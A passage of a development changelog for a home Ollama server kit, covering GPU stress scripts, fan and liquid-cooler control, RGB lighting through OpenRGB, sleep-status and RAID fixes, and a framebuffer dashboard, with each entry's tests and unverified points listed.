  JSON escaping, the sleep text against the HDMI panel's, the demo's
  refusals. test_cpu's history-column checks updated for 11 columns.
- Install: `bin/ollama1-admin` only (then `systemctl restart ollama1-admin`).
## 6b399 — gpu-burn.sh: the graphics card at 100% and nothing else (per Patrick)

- Driving the card through Ollama's HTTP requests (stability-test.sh's gpu phase)
  left it on and off between requests and used a lot of the processor. `tools/gpu-burn.sh
  [minutes] [model]` runs llama.cpp's `llama-bench` with ONE processor thread, over and
  over, on the model file Ollama already holds (no Ollama in the loop, no stress-ng), and
  prints every 30 s the card's busy percent, edge/junction temperatures, watts and the
  processor's busy percent. It stops with the reason on a new hardware-error record, at
  105 C junction, or when the card averages under 40% busy. Tests: TestGpuBurn.

## 6b398 — a graphics-card-only stability run that says what it is doing (per Patrick)

- `stability-gpu.sh [minutes] [model]` runs the card flat out and leaves the
  processor alone. The gpu/mix/all phases print every 30 s the temperatures,
  the card's busy percent and the answers so far, and stop with the reason when
  Ollama has answered nothing after 150 s (a run once sat with the card idle
  and said nothing); a failing request waits 2 s instead of spinning the
  processor. The option loop no longer loses the options in the tmux re-exec (6b397).

## 6b397 — a stability phase for the card at 100% and the processor at 50% (per Patrick)

- `stability-test.sh --phases mix` runs the graphics card flat out (Ollama, long
  answers nonstop) together with the processor at `--cpu-load` percent
  (default 50; 1-100), memory untouched, for `--minutes`. It is checked like
  the gpu phase: no hardware-error record, no stress-ng failure, and the model
  must really be on the card. The default run is still one load at a time
  (cpu, gpu, memory). Test: `test_the_mix_phase_is_the_card_plus_half_the_processor`.

## 6b396 — the panel's sleep line is the idle service's own decision; RAID check parsed (per Patrick)

Two bugs on the real monitor.
- **"Idle long enough: may sleep now" right after a wake.** The panel worked out
  its own idle time from the gateway's activity file and ignored the resume time
  and the busy reasons. Fixed at the source: `ollama1-idle` (`o1idle.Idle.tick`)
  now decides FIRST and then writes `/run/ollama1/idle.json` with the decision
  beside the setting: `sleep_ok` (the bool decide() returned: it is about to
  suspend), `reason` (decide()'s exact text), `idle_s` (seconds since the latest
  of last activity, boot and last resume: `o1idle.idle_seconds`), plus `at`,
  `enabled`, `minutes`, `supported`, `wake` as before. `o1panel.sleep_summary`
  shows only that: "Sleeps in mm:ss" (minutes*60 - idle_s - the file's age) when
  the reason is the timer ("idle N of M minutes"), the reason itself in amber
  when something blocks it (busy, running tool, a block lock, the card, a
  request), "Going to sleep now" only when sleep_ok, "Auto sleep is off",
  "No deep sleep on this machine", and "Sleep status unknown" (amber) when the
  file is older than 3 minutes or has no decision (an old service). Nothing is
  estimated in the panel any more. The admin panel and the app compute no idle
  time of their own (they show the setting and the last sleep/wake), so there is
  nothing else to align.
- **"RAID md127: check -%".** `o1stats.raid` split the progress line on the first
  "=", which is inside the bar "[==>...]". It now uses a regex for
  `(resync|recovery|check|reshape) = N%` with or without spaces, a
  `resync=DELAYED`/`PENDING` word (action, no percentage) and
  `finish=NNN.Nmin`. The panel line reads "RAID md127: check 12.1%, about 10 h
  left" (`o1dashui.raid_action`, `raid_left`). A scheduled check of a healthy
  [UU] mirror is information (blue, no warning in the Status box or the badge);
  a resync, recovery or reshape is amber; a missing member is red, with the
  recovery progress after it.
- Tests: ticks around a resume (idle_s restarts at 0, "idle 3 of 30 minutes"),
  every busy reason, sleep_ok, disabled, the file's age; the panel text in each
  state and at 1080p/1440p/4K without overflow; real mdstat samples (check,
  resync, recovery, degraded, idle, delayed) with every spacing; the colour rule.
- Install: lib/o1idle.py (then `systemctl restart ollama1-idle`), lib/o1stats.py,
  lib/o1dashui.py, lib/o1panel.py, then restart ollama1-dash.

## 6b388 — the Corsair liquid cooler is driven too, through liquidctl (per Patrick)

Patrick: "max the cooler's fans too, and make sure the pump runs at 100% when
necessary but not all the time". His H115i Platinum (USB 1b1c:0c17) has its
fans and pump on its own USB controller, not on the Super-IO headers.

- New `lib/o1aio.py`, used by `o1fan.Fan(aio=...)`. liquidctl is a subprocess
  with a 4 s timeout on every call (the unit's watchdog is 10 s), never
  fatal. `liquidctl list --json` finds the cooler (vendor Corsair and a
  description matching Hydro / H<nn>i; the product ids are only used by setup
  and are from memory: `liquidctl list` is the authority); `--match <the
  description>` goes on every later call. No liquidctl, or no cooler: one log
  line, looked for again every 5 minutes.
- The cooler runs in its own thread (`aio_loop`, one `step` a second); the
  poll loop only sets the phase (`set_phase`) and reads a snapshot, so a slow
  USB call can never stall the watchdog ping. `Fan(aio_inline=True)` steps it
  on the tick for the tests' fake clock. The learned table is shared with
  the case fans (`aio/fanN`, saved in the same fan.json; `_persist` has a lock).
- Mapping: working / hot / hold100 100% + pump extreme; calibrating 100% +
  balanced; hold50 50% + balanced; idle20 20% (floor per fan from stall
  learning, a fan with no rpm at 100% stays 100%) + quiet. Coolant >= 40 C
  (plausible readings only) forces extreme + 100% until < 35 C. The pump is
  extreme ONLY in working/hot/hold100 or when the coolant is hot.
- Status is read at most every 5 s, a command only when its target changed
  and not more often than every 5 s (a flapping phase is slowed to that
  rate); liquidctl has no batch for `set`, so each changed part is its own
  call (fans, then pump). `initialize` runs once per start and after a wake
  (`SIGUSR1` -> `fan.wake()` -> `aio.reset()`), then everything is sent again.
- Safe without us: `safe_exit` sets `fanN speed 25 30 35 60 45 100` (30% @
  25 C, 60% @ 35 C, 100% @ 45 C) and `pump mode balanced`. It runs on a
  clean stop (`Fan.shutdown`), after FAILS_MAX=5 failures in a row (the cooler
  is then left alone, the case fans go on), and from `ExecStopPost` after any
  exit through a marker file (`/var/lib/ollama1/fan-aio.json`, written when
  the first command succeeds, removed after a successful safe exit).
- Setup: `aio_setup` installs `liquidctl` (apt) only when the fan step is on,
  a Corsair Hydro id is on USB (sysfs idVendor/idProduct) and liquidctl is
  missing; the plan line mentions the cooler. Unit: `MemoryMax=192M` (a second
  Python), `AF_NETLINK` (libusb/udev), `RuntimeDirectory=liquidctl` (kept).
- Tests: `tests/test_aio.py` (a fake `liquidctl` script that records calls and
  prints JSON; 42 tests) and 28 `fan: cooler` mutants (pump rule, 40 C limit
  and its hysteresis, rate limits, de-dup, failure count, timeout, exit curve,
  marker, stop-post, stall, no-rpm, wake, usb ids, setup).
- Unverified (no cooler here): liquidctl's real status key names ("Liquid
  temperature", "Fan N speed", "Pump speed"; read loosely, a missing one is
  just not shown), the channel names `fan1`/`fan2`/`pump` and the curve
  argument format on a Hydro Platinum, whether the sandbox lets libusb/hidraw
  reach the device, and that the apt package is new enough. A cooler left at
  20%/quiet by a power cut keeps that setting until the service starts.

## 6b387 — more temperature sources for the fan override (per Patrick)

- The override (100% whatever the load, until 10 C under) now watches every
  temperature input of the Super-IO chip by its `temp*_label`: 70 C for
  system/board/AUXTIN and any label it does not know (unknown is monitored
  at the default, never ignored), 85 C for CPUTIN/PECI/TSI/CPU labels, 90 C
  for VRM/MOS (`\bMOS`, so CMOS stays 70), 80 C for CHIPSET/PCH; the DIMMs
  (jc42) 70 C; the card's memory 95 C and edge 85 C beside the junction 90 C.
  Two sensors with one name get a number ("DIMM 1", "DIMM 2").
- A reading of 0 C or less (-128 is an unplugged input) or 120 C or more is a
  disconnected or stuck sensor: `read_temps` gives it `None`, it is ignored,
  and `overheated()` lets go of its key if it was hot. A sensor whose file
  can't be read at all is left out of the list, so its state is kept (the
  older "a sensor that stops answering keeps its state" rule).
- `ollama1-fan status` shows `temps: highest X 60 C; closest to its limit: Y
  38 C of 70 (32 under)` and a `sensors:` line of all of them with their
  limits; the admin line ends with the same two facts.
- Tests: `TestTempSources` (each source and label class at its limit, below
  it, 9.9 and 10.1 under, implausible values 0, -0.5, -128, 120, 125, 255, 1000,
  a sensor that sticks while hot, the summary) and 16 `fan:` mutants for the
  new limits and the plausibility range.
## 6b395 — server lights: white idle, red while working (per Patrick)

Patrick (2026-10-04): "Lights 100% brightness on white when running, fade to
red when it's processing a query, then fade back to white when it's not
running anything." Kit only (`ollama1/`), branch `leds-1004` off `kit-1004`.
Written and tested against a fake OpenRGB server; NOTHING here has run on the
real server yet (see "Unverified").

- **One definition of working.** The probes and the "working" rule moved from
  `lib/o1fan.py` to `lib/o1work.py` (`Gpu`, `probes()`, `Work`), code moved
  unchanged; `Fan.working` delegates to a `Work`, and `o1fan.Gpu`/`o1fan.probes`
  stay as aliases. The fan's behaviour and tests are unchanged (58 tests
  green); only the four "working" mutants in `tests/mutate.py` now point at
  `lib/o1work.py`. Both services import it, so the lights and the fans cannot
  drift apart (a test asserts the same object and the same answers).
- **Two units, not a child process.** `ollama1-openrgb.service` runs
  `openrgb --server` (via `ollama1-leds openrgb`, which adds `--server-host
  127.0.0.1` only when `openrgb --help` lists it); `ollama1-leds.service`
  speaks the SDK protocol to it. A sibling unit restarts on its own
  (`Restart=always`, no start limit), and the client only has to reconnect.
  Both have `IPAddressDeny=any` + `IPAddressAllow=localhost`, so nothing but
  the loopback reaches the server even if a build ignores the host flag.
- **Why the server is root but cannot touch I2C.** It needs the root-only
  hidraw nodes. OpenRGB can also probe SMBus/I2C for memory and graphics-card
  RGB, which on some boards writes to chips that are not what it thinks (DIMM
  SPD). `DevicePolicy=closed` with only `char-hidraw` and `char-usb_device`
  makes `/dev/i2c-*` unopenable, so it cannot. `CapabilityBoundingSet=
  CAP_DAC_OVERRIDE` is the one capability kept (a node some rule gave to
  another owner). If Patrick wants DIMM lighting that is a deliberate change.
- **The client** (`lib/o1leds.py`) is stdlib: 16-byte little-endian header
  (`ORGB`, device, packet id, size); SET_CLIENT_NAME (50), REQUEST_PROTOCOL_VERSION
  (40; we offer 4 and use the lower of the two, 0 if the server never
  answers), REQUEST_CONTROLLER_COUNT (0), REQUEST_CONTROLLER_DATA (1, body = the
  version), UPDATELEDS (1050), UPDATEMODE (1101); DEVICE_LIST_UPDATED (51) is
  honoured; UPDATEZONELEDS (1051) has an encoder and test but is not used (the
  whole-device update covers every zone). Controller data is parsed for
  versions 0 to 4 (brightness from 3, segments from 4); anything else raises
  `ProtocolError`, counts are bounded. Versions above 4 are not parsed:
  we never offer them.
- **Mode.** Direct, else Custom, else Static; a device whose mode takes its
  colour in the mode (Static, mode-specific) gets UPDATEMODE with the colour
  each frame; a mode with a brightness gets `brightness_max`. Devices with no
  LEDs or no usable mode are skipped, and shown as such in `status`.
- **The fade.** One number, `pos`, 0 = white to 1 = red; the colour is
  smoothstep(pos) between 255,255,255 and 255,0,0, so a turn round in the
  middle starts from the colour on show and nothing jumps. 0.8 s to red, 2 s
  to white, both linear in time on `pos`. Frames at 20 Hz only while `pos` is
  moving; otherwise the loop sleeps until the next poll (2 s), which re-reads
  the probes, checks the socket, and sends the colour again (keepalive). The
  first tick of a fade has dt 0, so waking from a 2 s sleep never skips ahead.
- **The 3 s.** Counted from the poll that first sees no work (not from the last
  poll that saw work, which would shorten it by up to a poll): red lasts 3 to 5
  s after the work really ended. Boundary is strict: at exactly 3.0 s still red.
- **Failure.** A dead or broken server closes the client, sets the error (shown
  in `status` and the panel), and retries after 2, 4, 8, 16, 30 s (capped); the
  error is logged once per change, not per try. A tick that raises is logged by
  type only and the watchdog is still pinged (`WatchdogSec=30`: one connect may
  take up to 10 s). A stop (SIGTERM) sets white first. No CLI fallback: it
  would not reach hardware the server cannot.
- **Wake.** The sleep hook (`config/ollama1-sleep-hook`) restarts
  `ollama1-openrgb` (the USB devices may come back new) and sends `SIGUSR1` to
  `ollama1-leds`, which reconnects and resends the colour. Lights are not
  turned off for suspend (Patrick: the board decides).
- **setup.sh**: opt-in, default OFF (`--leds on|off`, `OLLAMA1_LEDS`, saved as
  `LEDS=`), `leds_choice`/`leds_plan` in `lib/setuplib.sh`, a plan line, and
  `step "Lights"` after Fans: `ollama1-leds setup on|off` installs `openrgb`
  with apt only when it is not already there, enables and restarts both units;
  off stops and disables both and removes nothing.
- **Panel.** `/run/ollama1/leds.json` (0644, written at each poll and on every
  state change) feeds `o1leds.panel_line()` into the admin state as `leds`,
  shown as one line under the fan line. `ollama1-leds status` reads the same.
- **Also fixed:** `tests/mutate.py` on `kit-1004` had a merge leftover (two stray
  lines after the "a saved off is not kept by a re-run" fan mutant) and did not
  parse; removed.
- **Tests.** `tests/test_leds.py` (70) with `tests/fakeopenrgb.py`, a real
  127.0.0.1 listener that builds replies with its own struct code (so an
  encoder bug in the kit cannot cancel out) and records every packet; 22
  mutants in `tests/mutate.py` (`leds: ...`: the delay, its boundary, where it
  counts from, the colours, the fade direction and durations, the bind
  address, brightness, mode preference, the unit's address filter and device
  policy, the default).

**Unverified on the real server (all of it):** that `openrgb --help` lists
`--server-host` on this build (if not, only the unit's address filter keeps it
local; `ollama1-openrgb` logs which); that `openrgb --server` runs headless
with `QT_QPA_PLATFORM=offscreen` and no display; that the board's Mystic Light
(1462:7c35) and the Corsair Hydro Platinum are detected through hidraw alone
(Corsair may need `char-usb_device`, which is allowed, or I2C, which is not);
that the pump head has a Direct mode (else Static with mode colour is used);
that the protocol version this build answers is one we parse; that the board
and cooler show exactly 255,255,255 at "100%" (Mystic Light may have its own
brightness scale); that `CapabilityBoundingSet=CAP_DAC_OVERRIDE` and
`DevicePolicy=closed` do not block something OpenRGB needs; that devices
survive or re-detect after a suspend; that the DIMM and graphics-card RGB, if
any, stay dark (by design: no I2C).

---

## 6b386 — fan levels 100 / 50 / 20 instead of automatic after the hold (per Patrick)

Patrick (2026-10-04) changed the 6b385 policy: idle (more than 2 minutes after
work) every controlled fan at 20%; working 100%; after work ends 100% for
60 s, then 50% for 60 s, then 20%; a new request at any time returns to 100%
and restarts the sequence. The temperature override stays. Everything below
replaces what 6b385 below says about "auto after the hold".

- Phases in `lib/o1fan.py`: `working` / `hot` / `calibrating` (100%),
  `hold100` (age < 60 s), `hold50` (60 <= age < 120), `idle20`. The boundaries
  are strict (`<`), tested at 59/60/61 and 119/120/121 s. pwm = round(pct *
  255 / 100), halves up: 20% = 51, 30% = 77, 50% = 128. While the service runs
  it always holds the outputs; it gives them back only when it stops.
- Nothing is known about the NCT6797 header layout (fan, pump, nothing), so a
  low level is never trusted. The first start measures each output's rpm at
  100% (6 s settle) and keeps it. 6 s after a low level, rpm 0 or under
  `fanN_min` raises that output by 10% a step to the lowest level that spins
  (floor per output, logged). Still >= 60% of its 100% rpm when asked for 20%:
  a probable pump, 100% for good, logged. No rpm at 100% (or no reading):
  100% only while working, otherwise given back to its own control. Learned
  values (rpm100, min_pct, always100, pump_checked) live under `learned` in
  `/var/lib/ollama1/fan.json`, keyed by chip name and pwm number (hwmonN moves
  between boots), and survive stops and reboots; the originals (`orig`) do not
  survive a reboot. To relearn: stop, delete the file, start.
- Crash safety reversed from 6b385: a crash must not leave fans at 20%, so
  `ExecStopPost` now restores after ANY exit (the `SERVICE_RESULT` check is
  gone) and `Restart=always` brings it back. Added `Type=notify`,
  `NotifyAccess=main`, `WatchdogSec=10` and a stdlib `sd_notify` ping
  (`WATCHDOG=1`, `READY=1` after the first tick) on every loop turn, also when
  the tick failed: a loop that does not run is what the watchdog catches.
  A restart that finds the originals still held (a kill with no stop-post)
  takes them over and runs the whole sequence from 100%.
- Wake: unchanged mechanism (SIGUSR1 from the sleep hook, per-tick verify),
  now at the current level. Status: `level: 50%  phase: hold50 30s`, each fan's
  rpm and `min N%`, notes for pumps and no-rpm outputs; the admin card line is
  `Fans: 20% (idle)` / `Fans: 100% (a request is running)` / `Fans: 100% for
  30 s more, then 50%` / `Fans: 50% for 30 s more, then 20%`.
- Tests: `tests/test_fan.py` (58 tests, fans whose rpm follows their pwm) and 41
  `fan:` mutants in `tests/mutate.py` (each timing and edge, the 100/50/20
  levels, the rounding, the restore, restore after any exit, the watchdog
  ping, the stall and pump rules, each limit and the hysteresis).
- Unverified on the MS-7C35: that a 20% pwm on each NCT6797 header spins what
  is plugged in (the stall check is the guard, and it needs rpm readings: an
  output with none is left to the BIOS except while working); nct6775's fanN
  numbering matching pwmN; that the card's fan answers pwm 51 and reports rpm.
  The 6 s settle may be short for a large fan spinning up from rest.
## 6b383 — every font and shape in the panel smooth, at the screen's real resolution (per Patrick)

Patrick: "Smooth all the fonts in the interface so it's not all blocky: use the
available resolution to your advantage, but keep everything large and readable."
- **Drawn at the real resolution.** `o1hipix.HiPixmap` is a Pixmap you draw on in
  LOGICAL units (the same ~640x360 grid, so every size and every layout rule is
  as before) that is stored at `scale` times that: on a 3840x2160 screen
  `o1fb.choose_scale` gives 6 and the panel is drawn at 3840x2160 with nothing
  stretched afterwards. `PanelRenderer` replaces the old per-frame render and
  `Presenter(info, lw*k, lh*k, 1)` takes its pixels as they are (XRGB8888: no
  conversion; only changed rows are written).
- **Text.** `o1vecfont` gained lower case (x-height 70, ascenders to the capital
  top, descenders to 125) and every printable ASCII sign plus the degree sign,
  and a mixed-case mode (`clean(text, mixed=True)`; the cost screen still
  uses capitals). Names keep their case. `o1vtext` measures in grid units for
  the layout (rounded up, so what fits there fits when drawn). Glyphs are
  cached as ready pixel rows per (character, height, colours); a string is a few
  slice assignments per glyph row.
- **Shapes.** `o1raster.stroke_rows` rasterizes capsules (round caps and joins)
  as sparse rows with an active-set sweep; used for glyphs, ring arcs, graph
  lines. Rounded rectangles and discs come from cached corner/disc coverage.
  Rectangles and hairlines stay exact. Graph fills run column by column
  under the line.
- **Cheap.** Boxes redraw only when their numbers changed (`box_key`: the
  numbers, only the tail of each series, a minute for the model countdowns
  which now show minutes); a changed box is cleared first (anti-aliased corners
  would otherwise pile up). Dials and graph plots are kept pictures
  (`HiPixmap.cached`, bounded to 6 M pixels) keyed by what they show; graph
  data is cut at a time step (`GRAPH_STEP_S` = 6 s: the plot is the data up to a
  multiple of 6 s) so a graph's picture is the same for several ticks.
  Measured with `tests`-style synthetic states, every number changing on every
  2-second tick: 1920x1080 24 ms per tick (1.2% of a core), 3840x2160 56 ms
  (2.8%), 10.7 MB written per tick at 4K; first frame 0.09 s / 0.22 s. Nothing
  changing: ~24 ms (the status and header boxes show seconds).
- **Found on the way:** `series()` now returns a few extra samples for the
  step; the panel's model countdown shows minutes; `--png --size` is the
  SCREEN's pixels (the grid and scale come from `choose_scale`).
- Tests: 155 -> the raster, the smooth surface (round corners, areas, clipping
  in logical units, caches equal to redrawing), the mixed-case font, and the
  whole panel at 1920x1080, 2560x1440 and 3840x2160 (nothing outside its box,
  hostile text, pairing, anti-aliased edges, incremental == full redraw, a
  still machine redraws nothing); 7 new mutants.
- Not verified on the monitor: how the smooth text reads from across the room,
  the real per-tick CPU including the sampler (a synthetic 4K bench here),
  and the first full-screen write.

## 6b385 — the server's fans run at 100% while it works, and a minute after (per Patrick)
(superseded by 6b386 for the levels after the hold and for crashes)

Patrick (2026-10-04): "keep the GPU fan on full anytime there's a request
running. We don't want to burn the bearings out on it, but I want maximum
cooling when it's working. If you can control all the system fans too, have
those go 100% when there's any request running ... 100% for one minute after
requests have ended ... so heat doesn't build up." Otherwise automatic.

- New root service `ollama1-fan.service` (`bin/ollama1-fan`, `lib/o1fan.py`,
  stdlib only). Polls every 2 s. "Working" reuses the auto-sleep probes and
  limits (o1idle: the gateway's activity file, `GPU_IDLE_PCT`, `scan_tools`,
  `LOAD_BUSY`). `o1sleep.busy_reasons` (downloads, updates, backups) is left
  out on purpose: it keeps the server awake but it is not heat. A tool such as
  stability-test.sh counts, and the load average (1 minute) lags a stress
  test's end by about a minute, so the hold after one is a little longer.
- Outputs: amdgpu `pwm1` and every `pwmN` of a Super-IO chip (`nct67xx`,
  `it8xxx` ...), found by chip name. Writes "manual, 255" (enable file first).
  A file with no write bit, or one a write fails on, is skipped and said once.
  Nothing below 255 is ever written except to put an output back.
- Originals: each output's `pwmN_enable` (and `pwmN` when it was manual) goes
  to `/var/lib/ollama1/fan.json` with the boot id BEFORE the first write.
  A restart or crash mid-hold takes them from there (not the manual values it
  would read now), holds a minute from the restart, then restores. A different
  boot id drops the file (the chip is back to its own settings).
- Stops: SIGTERM restores at once; ExecStopPost restores only when
  `$SERVICE_RESULT` is `success`; a crash leaves 100% and `Restart=always`,
  `StartLimitIntervalSec=0` brings it back. This reads Patrick's "stay at 100%
  rather than stopping" over "restore on crash": a crash is not a reason to
  slow the fans.
- Override: CPU 80 C (Tctl/Tdie), GPU junction 90 C (edge if there is no
  junction), NVMe composite 70 C force 100% until 10 C under the limit.
  A sensor that stops answering keeps its state.
- Wake: the sleep hook sends SIGUSR1 (`systemctl kill --kill-whom=main`), and
  every tick rewrites an output it holds whose values changed (amdgpu resets
  `pwm1_enable` on resume). In auto the service writes nothing at all.
- Modules: `ExecStartPre=-+ ... load-modules` runs `modprobe nct6775` outside
  the sandbox when no chip with fan outputs shows (ProtectKernelModules stays
  on for the service; ProtectKernelTunables is left off so /sys is writable).
  `setup on` writes `/etc/modules-load.d/ollama1-fan.conf` only when the chip
  loaded. NOT verified on the MS-7C35: whether the kernel's nct6775 binds to
  the NCT6797D without `acpi_enforce_resources=lax` (the README says what to
  look for in the kernel log).
- Status: `ollama1-fan status` (mode full / hold Ns / auto, why, outputs, rpm,
  temps; no root) and the admin panel's CPU card, one line from
  `/run/ollama1/fan.json` (`o1fan.panel_line`, `st["fan"]`).
- setup.sh: `--fans on|off` (default on; `OLLAMA1_FANS`; saved as `FANS=` in
  setup.env, always written; `fans_choice` in setuplib.sh) and a step "Fans"
  between graphics card tuning and Cloudflare that calls `ollama1-fan setup`.
  With `on` it removes the hand-made `ollama1-gpu-fan.service` (full speed
  always), stops it and gives amdgpu's `pwm1_enable` back (2) so the first
  "original" is not that unit's manual setting.
- Tests: `tests/test_fan.py` (fake sysfs, fake clock) and 25 mutants in
  `tests/mutate.py` ("fan: ..."): hold time and its edge, restart of the
  hold, 255, restore (enable and manual value), originals saved first, boot
  id, crash vs clean stop, wake re-apply, each limit, hysteresis, unwritable,
  each source of work, the hook, the old unit, the default.
## 6b382 — the cost screen in smooth rounded print, no asterisks (per Patrick)

Patrick on the real 4K monitor: the cost screen works, but the digits (a 5x7
bitmap scaled about 10x then x6) were blocky and hard to read.
- **New `lib/o1vecfont.py`: a stroke font.** Each glyph (0-9 . , : - / $ and the
  euro, pound and yen signs, A-Z, space) is a skeleton of lines and arcs drawn
  with a round pen (round caps and joins), anti-aliased by exact coverage:
  every segment is a capsule, and for each of 8 sub-rows of a pixel row the
  capsules' x-extent is found analytically, merged, and added as fractional
  coverage. No per-pixel distance tests, so it is fast. Glyph bitmaps (rows of
  0..255 coverage) are cached by (character, height); `Pixmap.blit_coverage`
  paints them over a flat background through a 256-entry colour table. Digits
  are 16% wider than the first design (Nunito-like proportions) and all one
  width. Capitals only; the screen's words are in capitals.
- **Drawn at the screen's own resolution** (`o1fb.choose_cost_scale`: 1:1 up to
  3840 wide, else a whole-number fraction), by its own `Presenter`; the panel
  keeps its 640x360 x k. A flip clears the screen and rewrites it in full.
  `o1panel.render_cost` keeps the picture until the figures or the size change
  (the clock is not on this screen), so after the first draw each two-second
  tick is a row compare and no writes. At 3840x2160: about 0.25 s to draw the
  first time, 10 ms to prepare the frame (plus the write of the 33 MB).
- **Layout.** Label, kWh and (if the history is short) a note in a left column;
  the figure, one common height for all three rows, fills the rest of the row.
  The ink (a $ or a comma reaches beyond the capitals) is centred and fitted
  by `vertical_extent`, so nothing touches the row's edge. Messages ("Set your
  electricity price in the admin panel", "No data yet") are drawn the same
  way, as large as they fit, wrapped by `wrap_vec`.
- **No asterisk anywhere on this screen** and no footnote (Patrick's explicit
  instruction for it; the estimate rule still holds on the other screens). The
  "only 3d 4h of data" note stays, in amber, under the kWh.
- **Found on the way:** `Presenter.merge` joined adjacent writes by repeated
  `bytes +`, quadratic on a 4K frame (4 s); it now joins once. A screen in
  plain XRGB8888 (the usual one) now sends the buffer's own bytes, with no
  conversion.
- Tests: the stroke font (areas of capsules to 1%, round ends and joins,
  anti-aliased edges, clipping, centring, fit), the cost screen at 640x360 to
  3840x2160 (one size for the three figures, overflow of 123456789012.34 in
  seven currencies at five sizes, the cache, the loop's presenter); four new
  mutants. `ollama1-dash --png out.png --screen cost [--size 3840x2160]`.

## 6b381 — Space on the server's keyboard shows only the electricity cost (per Patrick)

- The panel gets a second screen: three large rows, 24 HOURS / 7 DAYS / 30
  DAYS, each a cost in the tariff's symbol at the largest whole scale that
  fits (one size for all three), with kWh small beside the label. Space flips
  to it and back; every other key is ignored (`o1paneld.handle_keys`, with a
  0.3 s debounce so a held key is one flip). A pairing window takes the screen
  from either (`render(screen="cost")` is ignored while `st["pairing"]`). The
  normal footer says "Space: electricity cost".
- **Same calculation as the admin panel.** The root power service already
  computes `o1power.window()` for 1 d, 1 w and 1 m (30 d); `compact()` now
  also publishes those three (`cost`, `kwh`, `measured_h`, `est`) plus
  `currency`, `priced`, `since` in `/run/ollama1/power/summary.json`, and
  `o1metrics.power_state()` passes them through. Nothing is recomputed in
  the panel. `est` = any of the window's hours came from a source other than
  a plug; those figures get a `*` and a footnote (estimates always do).
  **The power service must be restarted** after the kit is updated
  (`sudo systemctl restart ollama1-power`), or 7 d and 30 d say NO DATA (the
  panel falls back to the 24 h figure of the old summary).
- Honest empties: no tariff price -> "Set your electricity price in the admin
  panel"; no readings -> "No data yet"; a window with none -> NO DATA, never a
  zero; a history shorter than 90% of a window -> "only 3d 4h of data". JPY
  has no decimals; unknown currencies show their code. The font gained
  the euro, pound and yen signs.
- **Keyboard.** `o1paneld.Keys` puts the unit's tty (stdin, tty1) in raw mode
  (no echo, no ISIG/ICANON), flushes what was typed before, reads with
  `select` for at most the loop's 0.5 s poll (so a press flips within half a
  second and the draw loop is never blocked), and restores the attributes in
  `finally`. A fd that is not a terminal just sleeps. getty is masked on
  tty1, so no login prompt can see the keys. KD_GRAPHICS does not change the
  keyboard mode, so the tty still delivers them (unverified on the server).
- `ollama1-dash --png out.png --screen cost` for the picture. Tests: the keys
  with a fake termios and select, the loop with a scripted keyboard, the
  windows, empties, currencies, no overflow of 1234.56 / 123456789012.34 in
  any symbol at 480x270 to 1280x1024, and the power summary round trip; four
  new mutants.

## 6b380 — a graphical information panel for the server's monitor (per Patrick)

Patrick: "annoying trying to read all these hash marks". With a monitor
connected the server now shows a picture instead of the text dashboard. He
chose a lightweight renderer drawn straight to the screen (no desktop, no
browser), low resolution being fine.

- **Where it lives (kit only, `ollama1/`).** `lib/o1pixfont.py` (a 5x7 bitmap
  font with descenders, crisp, drawn at whole-number scales; digits fixed
  width), `lib/o1gfx.py` (a pixel buffer: clipped rectangles, lines, arcs,
  text, a PNG writer), `lib/o1panel.py` (layout and the panels),
  `lib/o1fb.py` (the framebuffer and the console), `lib/o1paneld.py` (the
  loop), `bin/ollama1-dash` (mode, fall-back, `--png`).
- **Rendering.** The panel is drawn at about 640x360 and scaled up by the
  whole number that brings the screen's width nearest 640 (`choose_scale`:
  1080p x3, 1440p x4, 720p x2), centred; the rest stays black. The buffer
  is one `array('I')` of 0xRRGGBB, so a filled rectangle is a slice
  assignment and a frame takes under 25 ms. Each panel is drawn inside
  `Pixmap.clipped(box)` and `frame()` narrows the clip again to the panel's
  inside, so a widget cannot paint over a border or its neighbour; text is
  cut with "..." by its measured pixel width (`o1pixfont.fit`), never by its
  length. The bar rows cap their label and value columns (a 200-character
  mount name once pushed everything out of its box in a test).
- **Framebuffer.** `FBIOGET_VSCREENINFO`/`FSCREENINFO` give the size, depth,
  colour layout and stride; `Presenter` converts to 32, 24 or 16 bits with
  any layout through a colour lookup, scales a row once, and returns only
  the rows that changed since the last frame as `(offset, bytes)` writes
  (merged when contiguous), honouring `line_length` and the pan offset.
  `FbDevice.write` is `pwrite` on `/dev/fb0`; no mmap.
- **Console.** `TtyGraphics` sets `KD_GRAPHICS` on the unit's tty (it is the
  controlling terminal, so no capability is needed) and restores `KD_TEXT`,
  the cursor and a cleared screen in `finally`; SIGTERM is turned into a
  clean stop. While another virtual terminal is on the screen
  (`VT_GETSTATE`) nothing is drawn; coming back clears and redraws in full.
- **When it runs.** `--dash auto|text|graphic` (flag, then `OLLAMA1_DASH`,
  then `/etc/ollama1/dash-mode`, then auto). Auto = `/dev/fb0` exists and a
  `/sys/class/drm/*/status` says `connected` (`unknown` does not count). The
  text dashboard polls every 10 s and switches when a monitor appears. Any
  exception from the panel (open refused, odd depth, a bug) is logged to the
  journal with its traceback and the text dashboard takes over for the rest
  of the process; the console is back in text mode before that.
  `setup.sh --dash` (tiny change: `dash_mode_choice` / `dash_mode_step` in
  `lib/setuplib.sh`, saved as `DASH=` in `setup.env` only when not auto). The
  unit gets `SupplementaryGroups=... video` for `/dev/fb0`.
- **Data.** The same state dict as the text dashboard (`o1metrics.Sampler`),
  and `o1dashui.warnings()` for the problems, so the two cannot disagree.
  The sampler gained four one-second series (`gpu_temp`, `cpu_temp`,
  `cpu_mhz`, `fan_rpm`), `cpu.mhz`/`cpu.max_mhz` (from `o1cpu.CpuProbe`, every
  2 s), and `activity` (the gateway's activity file) and `idle`
  (`/run/ollama1/idle.json`) for the sleep line. The sleep line says "Sleeps in
  mm:ss" only if the idle service publishes `enabled` and `minutes` in
  `idle.json`; today it publishes `supported` and the wake cards only, so the
  panel shows "Idle for N" until it does (`sleep_summary` reads them if
  present).
- **Preview.** `ollama1-dash --png out.png [--size WxH] [--scale N]
  [--pairing] [--live]`. Sample data comes from `tests/dash_sample.py`
  (`--live` uses this machine).
- **Not verified on real hardware** (no framebuffer here): the ioctl structs
  were built from the kernel headers' layout and tested with packed fake
  bytes; `KDSETMODE` on the unit's tty, `/dev/fb0` permissions through the
  `video` group, `pwrite` on simpledrm/amdgpu fbdev emulation, and how the
  screen looks at 1080p are all for the first run on the server. If the
  panel does not appear: `journalctl -u ollama1-dash`, then
  `sudo ./setup.sh --dash text` puts the old dashboard back.
- Tests: `tests/test_panel.py` (font, buffer and clipping, layout, pixel
  formats and strides, the loop on a fake screen, detection with a fake
  sysfs, fall-back, the setting).

---
